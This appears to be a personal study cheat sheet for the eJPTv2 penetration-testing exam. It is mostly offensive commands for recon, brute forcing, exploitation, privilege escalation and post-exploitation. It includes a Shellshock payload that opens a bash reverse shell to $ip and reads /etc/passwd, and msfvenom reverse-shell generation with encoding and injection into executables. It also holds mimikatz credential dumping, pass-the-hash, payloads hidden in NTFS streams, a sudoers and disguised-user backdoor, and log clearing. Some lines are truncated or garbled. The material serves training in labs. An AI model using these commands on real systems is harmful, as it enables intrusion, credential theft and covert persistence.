# ejptv2

# Assessment Methodologies: Information Gathering

## Scanning:
**Passive Scan**: No directly contact with the victim

**Active Scan**: Directly contact with the victim

## Passive Scan:
To gather 
- ip addresses `host target.local` 
- hidden directly from search engines like `robots.txt` `sitemap.xml`
- Email Addresses 
- Phone Numbers
- Physical Addresses
- Web Technologies like `wappalyzer` `builtWith` `whatweb`
You can also download the whole website with `HTTrack`
**Tools**: `whois` `whois.is` `netcraft.com` 

**DNS Recon**: `dnsrecon` `dnsdumpster.com` 

**Firewall detect**: `wafw00f` 

**Subdomain Enumeration**: `Sublist3r` this tool may get blocked by google because we sends a tons of request

**google dorks**: `site:*.target.local` `inurl:form` `intitle:admin` `filetype:pdf` `intitle:"index of"`
`Waybackmachine` `exploit-db.com` 

**Email Gathering**: `theharvester`

**Leaked Databases**: `haveibeenpwned.com`


## Active Scann
DNS Records:
**A** : domain to IPv4
**AAAA** : domain to IPv6
**NS** : reference to domain nameserver
**MX** : domain to a mail server
**CNAME** : for domain aliases
**TXT** : Text records
**HINFO** : Host Information
**SOA** : domain authority
**SRV** : Service Records
**PTR** : IP to domains

**Zone Transfer**: copy or transfer zone files from one DNS server to another
DNS File on Linux: /etc/hosts

Tools: `dnsenum` `fierce` 

**Host Discovery**: `nmap >nmap -sn ip # -sn: no port scan`  `netdiscovery`
-> Have a look at nmap option (Cheat sheet)
Note: Some firewall blocks the ping packet, so to avoid sending it `nmap -Pn ip`


Banner: `nc $ip $port`



# Assessment Methodologies: Footprinting & Scanning

## Mapping the network
> arp-scan -I $interface -g ip/24

> fping -I $interface -g ip/24 -a 2>/dev/null

> nmap -sn ip/24

> zenmap

## Scanning Hosts
-sV 
-sA
-sC
--script=discovery
-T0-4
-sT
-sU
-A
-O



# Assessment Methodologies: Enumeration

## SMB
service for file share. port 445
netbios is an old version. port 139

to map a network drive on windows:
**GUI**: click right on network -> map network drive -> `\\ip\` -> browser -> finish
**cmd**: `net use * /delete` `net use z: \\ip\c$ password /user:administrator`

enumeration with nmap:
**nmap**: `nmap -p445 --script smb-protocols ip`

**nmap**: `nmap -p445 --script smb-enum-sessions ip`

**nmap**: `nmap -p445 --script smb-enum-shares ip`

**nmap**: `nmap -p445 --script smb-enum-shares --script-args smbusername=administrator,smbpassword=smbserver_771 ip`

**nmap**: `nmap -p445 --script smb-server-stats --script-args smbusername=administrator,smbpassword=smbserver_771 ip`

**nmap**: `nmap -p445 --script smb-enum-domains --script-args smbusername=administrator,smbpassword=smbserver_771 ip`

**nmap**: `nmap -p445 --script smb-enum-groups --script-args smbusername=administrator,smbpassword=smbserver_771 ip`

**nmap**: `nmap -p445 --script smb-enum-shares,smb-ls --script-args smbusername=administrator,smbpassword=smbserver_771 ip`


enumeration with smbmap:
**smbmap**: `smbmap -u username -p password -H target_IP`

**smbmap**: `smbmap -u guest -p "" -d . -H target_IP`

**smbmap**: `smbmap -u administrator -p smbserver_771 -d . -H target_IP`

**smbmap**: `smbmap -u administrator -p smbserver_771 -H target_IP -x "ipconfig"`

**smbmap**: `smbmap -u administrator -p smbserver_771 -d . -H target_IP -L`

**smbmap**: `smbmap -u administrator -p smbserver_771 -d . -H target_IP -r "C$"`

**smbmap**: `smbmap -u administrator -p smbserver_771 -d . -H target_IP --upload "/root/backdoor" "c$\backdoor"`

**smbmap**: `smbmap -u administrator -p smbserver_771 -d . -H target_IP --download "c$\flag"`


enumeration with metasploit:
**metasploit**: `auxiliary/smb/smb_version`

**metasploit**: `auxiliary/scanner/smb/smb_enumshares`

**metasploit**: `auxiliary/scanner/smb/sum_login` -> to bruteforce the passwords/users

hydra: `hydra -l username -P wordlist.txt $ip smb`

**nmblookup**: `nmblookup -A $ip` -> to list 

**smbclient**: `smbclient -L $ip -N` -> to list

**smbclient**: `smbclient //$ip//path -N` -> to connect

**smbclient**: `smbclient //$ip//path -U username ` -> to connect

**rpcclient**: `nmblookup -U "" -N $ip` -> to connect
`>enumdomusers` 

**enum4linux**: `enum4linux $ip`
-U for user enumeration
-G for group enumeration
-S for shares enumeration


## FTP
**anonymous login**: `ftp $ip` 

**hydra**: `hydra -L users.txt -P passwords.txt $ip ftp`

**nmap**: `nmap $ip -p 21 --script ftp*`


## SSH
**nmap**: `nmap $ip -p 22 --script ssh*`

**nmap**: `nmap $ip -p 22 --script ssh-hostkey --script-args ssh_hostkey=full`

**nmap**: `nmap $ip -p 22 --script ssh-auth-methods --script-args="ssh.user=$user"` -> to check if user need a password to login

-> to bruteforce
**nmap**: `nmap $ip -p 22 --script ssh-brute --script-args userdb=/root/user`

**hydra**: `hydra -L users.txt -P passwords.txt $ip ssh`

**metasploit**: `auxiliary/scanner/ssh/ssh_login`


## HTTP
**nmap**: `nmap $ip -p80,443 -sV -O`

**nmap**: `nmap $ip -p80,443 --script http*`

**nmap**: `nmap $ip -p80,443 --script http-header`

**nmap**: `nmap $ip -p80,443 --script http-enum`

**nmap**: `nmap $ip -p80,443 --script http-methods --script-args http-methods.url-path=/webdav/`

**whatweb**: `whatweb $ip`

**dirsearch**: `dirsearch -u $ip` or dirb: `dirb $url wordlist.txt`

**browsh**: `browsh --startup-url http://$ip` -> to browser the page on the console

**lynx**: `lynx http://$ip`  -> to browser the page on the console

**metasploit**: `auxiliary/scanner/http/http_version`

**metasploit**: `auxiliary/scanner/http/brute_dirs`

**metasploit**: `auxiliary/scanner/http/robots_txt`


## MySQL
port: 3306 
**nmap**: `nmap $ip -sV -p 3306 --script=mysql-info`

**nmap**: `nmap $ip -sV -p 3306 --script=mysql-database --script-args mysqluser="root",mysqlpass=""`

**nmap**: `nmap $ip -sV -p 3306 --script=mysql-users --script-args=mysqluser="root",mysqlpass=""`

**nmap**: `nmap $ip -sV -p 3306 --script=mysql-variables --script-args=mysqluser="root",mysqlpass=""`

**nmap**: `nmap $ip -sV -p 3306 --script=mysql-audit --script-args=mysql-audit.username="root",mysql-audith.password="",mysql-audit.filename="/usr/share/nmap/nselib/data/mysql-cis.audit"`

**nmap**: `nmap $ip -sV -p 3306 --script=mysql-dump-hashes --script-args=username="root",password=""`

**nmap**: `nmap $ip -sV -p 3306 --script=mysql-query --script-args=query="select * from books.author;",username="root",password=""`

```
>mysql -h $ip -u $username -> login to the database
>show databases;
>use $database;
>SELECT * from $database;
>SELECT load_file("/etc/shadow");
```

**metasploit**: `auxiliary/s w

**hydra**: `hydra -L users.txt -P passwords.txt $ip mysql`
 
port:1433
**nmap**: `nmap $ip -sV -p 1433 --script=ms-sql-info`

**nmap**: `nmap $ip -sV -p 1433 --script=ms-sql-ntlm-info --script-args mssql.instance-port=1433`

**nmap**: `nmap $ip -sV -p 1433 --script=ms-sql-brute --script-args=userdb=users.txt,passdb=passwords.txt`

**nmap**: `nmap $ip -sV -p 1433 --script=ms-sql-empty-password`

**nmap**: `nmap $ip -sV -p 1433 --script=ms-sql-query --script-args=ms-sql-query="select * from master..syslogins;",mssql.username="root",mssql.password="" -oN output.txt`

**nmap**: `nmap $ip -sV -p 1433 --script=ms-sql-dump-hashes --script-args=mssql.username="root",mssql.password="password123"`

**nmap**: `nmap $ip -sV -p 1433 --script=ms-sql-xp-cw


**metasploit**: `auxiliary/scanner/mssql/mssql_`


# Assessment Methodologies: Vulnerability Assessment

Case Studies

**Heartbleed**: `nmap -p 443 --script ssl-heartbleed $ip` and for exploitation search on exploit-db.com or metasploit

How it works?

Client -> Set Password: 1234 + Password_length:4 -> Server

Client <- Confirm Password: 1234 + Password_length:4 <- Server

Attacker -> Set Password: 1234 + Password_length:50 -> Server

Attacker <- Confirm Password: 1234jalslaklasa + Password_length:50 <- Server

Here The Server will send data from memory to fillfull the password length. so these data from server momery could be sensitive!!

**EternalBlue-MS17-010**: `nmap $ip --script smb-vuln-ms17-010` and for exploitation search on exploit-db.com or metasploit

**log4J**: 

Nessus

# Auditing Fundamentals
Theory :)

# 3.1 System-Host Based Attacks
# Windows
- Microsoft IIS is a web server. port:80/443
- WebDAV is an extension to delete/update/move/copy files on a server. port:80/443
- SMB/CIFS is a network share protocol. port:445
- RDP is  a remote access protocol. port:3389 (disable by default)
- WinRM is a remote management protocol. port:5986/443 (enable by default)

## Microsoft IIS
Supported executable file extension:
- .asp - .aspx - .config - .php

## WebDAV
tools: 
- **davtest**: to check what we can move/upload/execute on the server.
`davtest -auth username:password -url http://$ip` 
- **cadaver**: support cli to upload/download/delete/move/copy files on the server
`cadaver http://$ip/webdav`
`put /usr/share/webshells/asp/webshell.asp` -> to upload a shell on the server
- **hydra**: To break WebDAV basic authenication
`hydra -L users.txt -P passwords.txt $ip http-get /webdav/`

to exploit: 
1. nmap to identify
2. break the basic authentication (guess or hydra)
3. devtest
4. cadaver

exploit with metasploit:
Way one:
1. create a shell `msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -f asp > shell.asp`
2. upload the shell with cadaver `put shell.asp`
3. start the listener 
`msfconsole`
`use multi/handler`
`set payload windows/meterpreter/reverse_tcp`
`set lhost $ip`
`set lport $port`
`run`
4. open the shell on the target and reverse connection will be recieved
`meterpreter> sysinfo`
`meterpreter> getuid`

Way two:
`msfconsole`
`search iis upload`
`use $payload`
`set $options`
`run`


## SMB
PsExec is a tool similar to RDP but it uses the cli
Exploit with psexec tool:
- to bruteforce: `msfconsole;search smb_login`
  `nmap --script smb-brute.nse -p445 <host>`
  `hydra -l administrator -P /usr/share/wordlists/rockyou.txt $ip smb`
- to access: `psexec.py Administrator@$ip cmd.exe`

Exploit with metasploit modul
`use /exploit/windows/smb/psexec`

Exploiting Eternalblue:
-> Working on Systems that are running SMBv1 only

-> to check: `nmap -sV -p445 --script=smb-vuln-ms17-010 $ip`

-> Exploit AutoBlue from github or using metasploit

-> AutoBlue: download AutoBlue -> run the bash script -> open listener `nc -nvlp 1234` -> `python eternalblue_exploit7.py $target_ip shellcode/sc_x64.bin`

-> metasploit `msfconsole;search eternalblue`


## RDP
to enumerate -> `msfconsole; search rdp_scanner`

to bruteforce-> `hydra -l administrator -P /usr/share/wordlists/rockyou.txt $ip rdp -s $port`

to connect-> `xfreerdp /u:administrator /p:passowrd123 /v:$target_ip:port`

Exploiting BlueKeep: `msfconsole; search bluekeep`
remember to set a target `show targets; set target $number`, if you do not know your target, try all of them :)


## WinRM
exploit with tools:
- **crackmapexec**: to bruteforce and also run commands on target
  - `crackmapexec winrm $target_ip -u administrator -p passwords.txt`
  - `crackmapexec winrm $target_ip -u administrator -p password123 -x "systeminfo"`
- **evil-winrm**: to get command shell session 
  `evil-winrm.rb -u administrator -p password123 -i $target_ip`

exploit with metasploit:
`msfconsole; search winrm`
remember to force to use the VBS cmdStager `set FORCE_VBS true`



# Privilege Escalation
-> Metasploit: `search suggester`

-> meterpreter: `getsystem`

-> linux/windows_suggester from github
also by getting the systeminfo, run `systeminfo`, then copy the information and save them in a file, then pass that file to the linux/windows_suggester tool. `*suugester.py --systeminfo win.txt`

### Bypass UAS (User Account Control)
Tools:
- UACME from github: upload it on target and run the payload using it `.\Akagi64.exe 23 paylaod.exe`, make sure to start your listener to get the session connection.

## Access Token Impersonation
Windows Access Token are created by winlogon.exe process and managed by LSASS for authentication process. this token is then attached to the userinit.exe process, which all child process that runs under the user will copy that token and run under the privilege of that user.

Privileges that are required for impersonate attack:

**SeAssignPrimaryToken**: This allows a user to impersonate tokens

**SeCreateToken**: This allows a user to create a arbitrary token with administrative priviliges.

**SeImpersonatePrivilege**:This allows a user to create a process under a security context of another user with administrative privileges


Incognito is a built-in meterpreter module to impersonate user tokens after exploitation..
```
meterpreter> pgrep explorer -> to migrate the session to another process and explorer process is recommended. and if you run `getprivs` but you get and error do that also.
meterpreter> migrate $explorer_id
meterpreter> getuid
meterpreter> getprivs
meterpreter> load incognito
meterpreter> list_tokens -u
meterpreter> impersonate_token "$name_of_the_token"
meterpreter> getuid
and keep doing that until you found the "NT AUTHORITY/SYSTEM"
```
## Alternate Data Streams (ADS)
ADS is an NFTS file attribute. 
Any file create on NTFS formatted drive will have 2 different forks/streams:
- Data Stream: Default stream that contain the data of the file
- Resource stream: typically contains the metadata of the file 
Here attacker can use ADS to hide malicious code by storing it in the file attribute resource stream(metadata) to evade detection
1. open cmd
2. `cmd> notepad test.txt`
3. `cmd> notepad test.txt:secrets.txt`
4. `cmd> type payload.exe > test.txt:payload.exe`
5. `cmd> start test.txt:payload.exe` -> error, so we create a symbol link for that
5. `cmd> mklink wupdate.exe test.txt:payload.exe` 
6. `cmd> wupdate` -> whenever you type wupdate the payload will be executed!

you can hide any type of files!!!!!


## Windows Credential Dumping
-> Windows stores hashed user account passwords locally in the SAM database. It encrypted with a syskey.
-> Authentication and verification of user credentials is facilitated by the Local Security Authority (LSA).
-> look at LM/NTLM hashing and how they work!

## Windows Configuration Files
These files contain user account and system informations encoded with base64
`C:\Windows\Panther\Unattend.xml`
`C:\Windows\Panther\Autounattend.xml`
so download them with the meterpreter session and look in them for users credentials
and use `psexec.py Administrator@$ip` to connect to that user and higher privileges.

`certutil -urlcache -f https://$ip/payload.exe payload.exe` -> download payload.exe with cmd


## Hashdump with mimikatz - persistence
**mimikatz** is a tool to extract clear-text passwords from the lsass.exe process memory where hashes are cached. 
**Kiwi** is meterpreter built-in tool similar to mimikatz.
Everything happen on memory. Mimikatz extract the hashes from momery not from SAM file!!!

```
meterpreter> pgrep lsass
meterpreter> migrate $lsass_ip -> this step will give you a higher privileges
meterpreter> getuid
meterpreter> load kiwi
meterpreter> ? -> for help for kiwi
meterpreter> lsa_dump_sam -> to get NTLM users credentials

meterpreter> cd c:\\
meterpreter> mkdir Temp
meterpreter> cd Temp
meterpreter> upload mimikatz.exe
meterpreter> .\mimikatz.exe
mimikatz# privilege::debug -> check if we have privileges
mimikatz# lsadump::sam
mimikatz# lsadump::secrets
mimikatz# sekurlsa::logonpasswords
```

## Pass the hash attack
Tools: 
- **metsaploit PsExec module**,
- **Crackmapexec**

after getting an admin privileges, do
`meterpreter> load kiwi`
`meterpreter> lsa_dump_sam`  to get NTLM users credentials
`meterpreter> hashdump` 

to exploit
-> with metasploit `search smb/psexec`
For this module you need to set target (command/native upload/...) and you need the LM:NTLM hash, not only the NTML hash 
-> with crachmapexec `crackmapexec smb $ip -u administrator -H $NTLM_hash- x "ifconfig"`



# Linux

## Exploiting Shellshock
nmap: `nmap -sV $ip --script=http-shellshock --script-args "http-shellshock.uri=/gettime.cgi"`

inject payload in User-Agent header with burpsuite: `() { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'`
inject payload in User-Agent header with burpsuite: `() { :; }; echo; echo; /bin/bash -c 'bash -i>&/dev/tcp/$ip/$port 0>&1'`

metasploit: `search shellshock`
metasploit: `search http/apache_mod_cgi`
You need to specify the $target_ip and the $target_uri


## FTP
port 21, and there are many ftp service like proFTP
**Bruteforce**: `hydra -L users.txt -P passwords.txt $ip ftp`
**metasploit**: `search ProFTP`
**searchsploit**: `searchsploit ProFTP`


## SSH
port 22 
**Bruteforce**: `hydra -L users.txt -P passwords.txt $ip ssh`


## SAMBA
port 445, old version of samba is NetBios port 139

**hydra**: to bruteforce `hydra -L users.txt -P passwords.txt $ip smb`

**metasploit**: to bruteforce `search smb_login`

**smbmap**: to enumerate the shares `smbmap -H $ip -u admin -p password123`

**smbclient**: to enumerate the shares `smbclient -L $ip -U admin`

**smbclient**: to access the shares `smbclient //$ip/folderToAccess -U admin`

**emum4linux**: to enumerate all informations about the OS `enum4linux -a $ip`



## Privilege Escalation
**tools**: linux-exploit-suggester

**cronjobs**: look for cronjobs that runs scripts as root privileges `crontab -l` to list the cronjobs but it does not work everytime(why??)

after we found the file, that runs automatically, we go search what scripts uses that file. `grep -rnw / -e "/home/student/file_cronjob" 2>/dev/null`. This command will list the script/file that contains that path!. so we edit that script/file to get higher privileges. Ex: `printf '#!/bin/bash\necho "username ALL=NOPASSWD:ALL">> /etc/sudoers' > Script_Path`

`sudo -l` -> to list sudoers permissions

`student>sudo su` will be entered to root user with no password!!!

**Exploiting SUID Binaries**: 

/etc/passwd

/etc/shadow

$1 -> MD5

§2 -> Blowfish

$5 -> SHA-256

$6 -> SHA-512

# 3.2 Network-Based Attacks

## Tshark
-> Start capturing traffics with tshark
`tshark -i wlan0 -w capture-output.pcap`

-> Read from a pcap file
`tshark -r capture-output.pcap`

-> capture http request and filter for host and user-agent
`tshark -i wlan0 -Y http.request -T fields -e http.host -e http.user_agent`

-> 
`tshark -r traffic.pcap -Y "http contains password"`

`tcp.flags.reset==1`

`ip.dst==192.168.1.10`

`-T fields -E separator=, -e ip.src -e ip.dst`

`not (tcp.port == 80) and not (tcp.port == 25) and ip.addr == 192.168.0.1`

`not arp and not (udp.port == 53)`

`tshark -r traffic.pcap -Y "http contains password"`

`tshark -r traffic.pcap -Y "http.request.method==GET && http.host==yahoo.com" -T fields -e ip.dst`

`tshark -r traffic.pcap -Y "ip contains amazon.com && ip.src==192.168.1.1" -e ip.src -e http.cookie`

`tshark -r traffic.pcap -Y "ip.src==192.168.1.1 && http" -T fields -e http.user_agent`

-> capture and filter for POST method and contains password
`tshark -i wlan0 -Y 'http.request.method == POST and tcp contains "password"'`

-> display how many line captured in the test.pcap
`tshark -r test.cap | wc -l`

-> read the first 100 line (file) or capture only the first 100 packets (interface)
`tshark -r test.pcap -c 100`

-> print all protocols 
`tshark -r test.pcap -T fields -e frame.protocols`

-> show only the http or tcp or arp traffic
`tshark -r test.pcap http or tcp or arp`

-> print only packets only source IP and URL for all GET request packets
`tshark -r HTTP_traffic.pcap -Y "http.request.method==GET" -T fields -e ip.src -e http.host`


## wireshark
https://www.comparitech.com/net-admin/wireshark-cheat-sheet/


## ARP

`echo 1 > /proc/sys/net/ipv4/ip_forward`

`arpspoof -i <network adapter> -t <victim IP address> -r <gateway IP address>`

`arpspoof -i eth0 -t 10.10.1.4 -r 10.10.1.1`


# 3.3 The Metasploit Framework (MSF)

**Non-Staged Payload**: Payload send to target with the exploit

**Staged Payload**: Payload send to target in 2 parts. first part contains the payload to establish a reverse connection and download the second part of the payload and execute it.

**Stagers**: to establish a stable connection channel

MSF Module Location: `/usr/share/metsaploit-framework/modules` and for specific user: `~/.ms4/modules`

-> look at ptes methodology github 

-> configuration

`systemctl enable postgresql` or `service postgresql start`

`msfdb init` if errors do `msfdb reinit` but reinit will remove your database

-> MSF common commands
```
show all
show encoders
show exploits
search -h
use -h
back
workspace -> list all workspaces
hosts
workspace -h
workspace -a $name_workspace -> creat a workspace
workspace $name_workspace to switch to a workspace
setg lport 4444
setg lhost $ip
setg rhosts $target_ip
search type:auxiliary name:http -> smtp_login, smtp_enum, and so on
search type:exploit name:http
```

## Port Scanning with nmap

Options already discussed in information gathering section!!!
```
kali> nmap -sV -Pn $ip -oX nmap_results` -> to import the nmap_results to MSF, first create a new workspace, then open MSF, then 
meterpreter> db_import /root/nmap_results`
meterpreter> hosts -> to confirm that nmap_results are imported
meterpreter> services -> show running services on target through the nmap_results
meterpreter> vulns -> show vulns
meterpreter> db_nmap -sV -Pn -O $ip -> here the results will be saved in the MSF database for the chosen workspace!!!
```

## Port Scanning with Auxiliary Modules
```
msf> search portscan ->  and then use any module you like
after exploiting
meterpreter> run autoroute -s $target_ip_1_target
meterpreter> background
then search for portscan and choose one and "set RHOSTs $ip_from_another_subnet_2_target"
```

## Installing MSF autopwn
1. download it from github

2. move it to /usr/share/metasploit-framework/plugins/

3. load it in metasploit `msf6> load db_autopwn`


## Nessus
install it -> run it -> export a report -> import the report to metasploit `db_import $report` 


## WMAP
```
msf6> load wmap
msf6> wmap_sites -h
msf6> wmap_sites -a $ip -> set all targets you want to scan in the feature
msf6> wmap_targets -a
msf6> wmap_run -t http://$ip -> set target to scan now 
msf6> wmap_run -h
msf6> wmap_run -t
msf6> wmap_vulns -l -> list all vulns found
msf6> wmap_run -e
msf6> vulns -> list detaits about found vulns
```


## MSF payloads
```
kali> msfvenom --list payloads
kali> msfvenom -a x86 -p windows/meterpreter/reverse_tcp .......
kali> msfvenom -a x64 -p windows/x64/meterpreter/reverse_tcp .......
```

-> encoding and injecting
```
msfvenom --list encoders
-e -> $encode_type to set the encoding type
-i 10 -> to set the number of encoding iterations to 10, the more the better
-x winrar.exe -> to inject payload into another .exe programm
-k
```

`run post/windows/manage/migrate` -> migrate the process to another one

## automation
`/usr/share/metasploit-framework/scripts/resource` -> some automation scripts

`vim handler.rc`
```
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.10.10.2
set LPORT 1234
run
```
to run the script `msfconsole -r handler.rc`

`vim scan.rc`
```
use auxilary/scanner/portscan/tcp
set rhost 10.10.10.2
run
```
to run the script `msfconsole -r scan.rc`

-> to export command you types:
`msf6> makerc ~/Desktop/mycommands.rc`



# Exploitation

## Windows Exploitation
1. nmap
2. msf6 > search Proftp
3. exploit it 

if meterpreter session is x86 and the target system is x64 so set the payload to x64
`set payload windows/x64/meterpreter/reverse_tcp` 


## Linux Exploitation
1. nmap
2. msf6 > search Proftp
3. exploit it 


-> to upgrade session from shell to meterpreter
`session -u $session_id`
or
`search shell_to_meterpreter`



locate /opt/framework3/msf3
msfconsole -> to run the MSF

-> to run a module from inside the meterpreter:
```
meterpreter > run post/multi/gather/env

or crtl(strg) + z / background then 

msf > use post/windows/gather/hashdump
msf > show options 
msf > set SESSION 1 
msf > run
```

-> Encode a payload from msfpayload 5 times using shikata ga-nai encoder and output as executable: 
`$ msfvenom -p windows/meterpreter/reverse_tcp -i 5 -e x86/shikata_ga_nai -f exe LHOST=10.1.1.1 LPORT=4444 > mal.exe`

-> to search for a module:
`msf > search [regex]`

-> Run the exploit expecting a single session that is 
immediately backgrounded:
`msf > exploit -z`

-> Run the exploit in the background expecting one or more sessions that are immediately backgrounded:
`msf > exploit –j` 

-> List all current jobs (usually exploit listeners): 
`msf > jobs –l` 

-> Kill a job: 
`msf > jobs –k [JobID]`

-> List all backgrounded sessions:
`msf > sessions -l`

-> Interact with a backgrounded session:
`msf > session -i [SessionID]` 

-> Background the current interactive session: 
`meterpreter > <Ctrl+Z>` 
or
`meterpreter > background`

# 3.4 Exploitation

## Banner Grabbing
`nmap -sV --script=banner $ip`

`nc $ip $port`

`ls /usr/share/nmap/scripts | grep shellshock`


## Searching for exploits
`msf6> search xxxx`

`searchsploit xxxx`

`exploit-db.com`

`rapid7.com/db`

`search on google`

`search on github`

## Compile Exploits
`apt install mingw-w64`

`i686-w64-mingw32-gcc exploit.c -o exploit.exe`

`i686-w64-mingw32-gcc exploit.c -o exploit.exe -lws2_32` -> exploit for 32 bits

`gcc exploit.c -o exploit.exe`

## Bind and Reverse shell
`nc $ip $port <options>`

`nc $ip $port  -nv < text.txt` transfer a file

`nc $ip $port  -nv > text.txt` recieve a file

-> for windows - bind shell

`nc $ip $port  -nvlp 1234 -e cmd.exe` listener to connect to a target through cmd

`nc $ip $port  -nv` to connect to that listener through cmd

-> for linux - bind shell

`nc $ip $port  -nvlp 1234 -c /bin/bash/` listener to connect to a target through bash

`nc $ip $port  -nv` to connect to that listener through bash

-> reverse shell sheet cheat on github allThePayloads or on revshells.com

## Powershell Empire
```
apt install powershell-empire starkiller -y
powershell-empire server
powershell-empire client
msfvenom -p windows/shell/reverse_tcp LHOST=10.10.16.2 LPORT=1234 -f asp > shell.aspx
```
Note: if you do not get the banner from nmap try it manually with netcat `nc $ip $port`


# 3.5 Post-Exploitation
 ## Enumeration System Information
What are we Looking for ? 
- Hostname
- OS Name (Windows 7, 8 etc..)
- OS Build & Service Pack (windows 7 SP1 7600)
- OS Architecture (x64/x86)
- Installed Updates/Hotfixes 

`meterpreter> getuid`

`meterpreter> sysinfo`

`shell> hostname`

`shell> systeminfo`

`wmic qfe get Caption,Description,HotFixID,InstalledOn` -> to get additional infos about the updates


## Enumerating Users & Groups
- Current User and Privileges
- Additional User information policy
- Other users on the system
- groups
- members of the built-in administrator group

`meterpreter> getuid` == `shell> whoami`

`meterpreter> getprivs` == `shell> whoami /priv`

`msf> search enum_logged_on_users`

`shell> query user`

`shell> net user administrator`

`shell> net localgroup` -> enumerate current user for localgroup

`shell> net localgroup administrators` -> show users, that are in the localgroup of the administrators


## Enumerating Networking information
- Current IP and network adapter
- internal networks
- tcp/udp services
- other hosts on the network
- routing table
- windows firewall state

`shell> ipconfig`

`shell> route print` -> to get the routing table

`shell> arp -a` -> to discover other hosts on the network

`shell> netstat -ano`

`shell> netsh firewall show state`

`shell> netsh firewall show state` -> it may be deprecated

`shell> netsh advfirewall firewall help`

`shell> netsh advfirewall firewall dump`

`shell> netsh advfirewall show allprofiles`


## Enumerating Process and Services
- Running Process and Services
- Scheduled tasks

`meterpreter> ps`

`meterpreter> pgrep explorer.exe` -> search for specific process

`meterpreter> migrate $process_id` -> migrate to explorer.exe, because it is stable

`shell> net start` 

`shell> wmic service list brief` -> show services

`shell> tasklist /SVC` -> display list of services with its process

`shell> schtasks /query /fo LIST`-> enumerate schedule tasks


## Automating Windows Local Enumeration
`meterpreter> show_mount`

`msf> search win_privs`

`msf> search enum_logged`

`msf> search checkvm`

`msf> search enum_applications`

`msf> search enum_computers`

`msf> search enum_patches`

`msf> search enum_shares`

download the JAWS powershell script and run it to enumerate the system locally!

upload it to Temp directory in the C: drive

`shell> powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1 -OutputFilename jaws-enum.txt`

`meterpreter> download jaws-enum.txt`



# Linux
## Enumerating System Information
- Hostname
- Distribution and distribution release version
- kernel version and architecture
- CPU information
- Disk information and mounted drives
- installed packages/software
- 
`meterpreter> sysinfo`

`bash> cat /etc/*release`

`bash> cat /etc/issue`

`bash> uname -a`

`bash> env`

`bash> lscpu`

`bash> df -h`

`bash> lsblk`

`bash> `

`bash> lsblk`

## Enumerating Users & Groups
- Current User and Privileges
- Other users on the system
- groups and members in these groups

`bash> cat /etc/passwd`

`bash> groups $username` -> display groups, that a user in them

`bash> usermod -aG $group $username` -> add user to a group

`bash> last` -> see users, that logged as ssh

`bash> lastlog`

## Enumerating Networking information
- Current IP and network adapter
- internal networks
- tcp/udp services
- other hosts on the network

`meterpreter> ifconfig`

`meterpreter> netstat` -> display udp/tcp connections

`meterpreter> route` -> display routing table

`meterpreter> arp`

`bash> cat /etc/networks` -> display interfaces and its ip

`bash> cat /etc/hostname`

`bash> cat /etc/hosts`

`bash> cat /etc/resolv.conf`

## Enumerating Process and Cron Jobs
- Running Process and Services
- Cron Jobs

`bash> ps`

`bash> crontab -a`

`bash> crontab -l`

## Automating Linux Local Enumeration
- use LinPeas or LinEnum tool from github

`msf> search enum_configs`-> results are saved in the loot directory under /home/username/.msf4/loot

`msf> search enum_network`

`msf> search enum_system`

`msf> search checkvm`


## Transfering files 
`python -m SimpleHTTPServer 80`

`python3 -m http.server 80`

`certutil -urlcache -f http://$ip:$port/mimikatz.exe mimikatz.exe`

## Upgrading from non-interactive shells
`/bin/bash -i`

`python -c "import pty; pty.spawn('/bash/bin/')"`

`perl -e "exec '/bin/bash';"`

`ruby: exec '/bin/bash'`


## Post-Exploitation 
`meterpreter> getsystem` -> to get higher privileges

`meterpreter> getuid`

`meterpreter> getprivs`

`meterpreter>  show_mount`

`meterpreter>  ps`

`meterpreter>  migrate $process_id` -> to migrate to a process with higher privileges

`meterpreter>  background`

## Post-Exploitation Windows

## Post-Exploitation-Modules
`msf6> search migrate` -> you can use any module you like for post-exploitation

`msf6> search win_privs` -> to enumerate privilege escalation

`msf6> search enum_logged_on`

`msf6> search checkvm` -> to check if target on vm

`msf6> search enum_applications` -> enum installed application on target

`msf6> search enum_av platform:windows type:post` -> check for firewall

`msf6> search search enum_computer`

`msf6> search search enum_patches`

`msf6> search enum_shares`

`msf6> search *enum*` -> show all enumeration modules

`msf6> search rdp platform:windows` -> use any module you like, you can try all of them



## Bypass UAC
`msf6> search bypassuac`

`msf6> search bypassuac_injection`

`meterpreter> getsystem`

`meterpreter> hashdump`

if you can not get the hashdump try to migrate to another process like lsass or explorer 

## Mimikatz and kiwi
already explained before

## Pass the hash
already explained before

## Persistence 
`search platform:windows persistence`

`search platform:windows persistence_service` -> if you kill all sessions and run the handler(same payload, port), you will get the session again

## Persistence with RDP
port 3389. RDP is disabled by default on windows but we can use a metasploit module to enable it after we exploit the victim

`search enable_rdp`

`target> net user administrator password123` -> to modify 

`linux> xfreerdp /u:administrator /p:password123 /v:$ip`

## Clearing logs
`meterpreter> clearev`

## Pivoting
`meterpreter> ifconfig`

`meterpreter> run autoroute -s $ip_internal/24` -> after this route you can access that $ip_internal/24 through the victim_ip

`msf6 > search portscan`

`msf6 > set rhosts $ip_internal`

`meterpreter> portfwd add -l 1234 -p 80 -r $ip_internal`

`msf6 > search portscan`



## Post-Exploitation Linux
`shell> cat /etc/passwd`

`shell> cat /etc/*issue`

`shell> env`

`shell> netstat -antp`

`shell> ps aux`

`shell> groups username` -> what groups is this user part of

`shell> uname -a`

`shell> uname -r`

`shell> chkrootkit -V` -> enumerate rootkit version

`msf6> session -u $session_id`

`msf6> search enum_config` -> this will get all configuration files

`msf6> loot` -> to show where our gathered information are saved

`msf6> search enum_network`

`msf6> search env`

`msf6> search enum_protections`

`msf6> search enum_system`

`msf6> search checkcontainer`

`msf6> search checkvm`

`msf6> search enum_users_history`

`msf6> search hashdump`

## Persistence	on Linux
after exploitation and privilege escalation

-> for persistence you can create a backdoor user but this only works if target server has ssh or remote access enabled
The user should be difficult to identify like call the user "ftp" `useradd -m ftp -s /bin/bash;passwd ftp;usermod aG root ftp;usermod -u 15 ftp;usermod -g 15` 

-> for persistence you can create a ssh keys. create a username and in that username create a new ssh keys

`msf6> search platform:linux persistence`-> try all displayed modules if possible!

to access ssh with a private key `ssh -i private-key root@$ip`









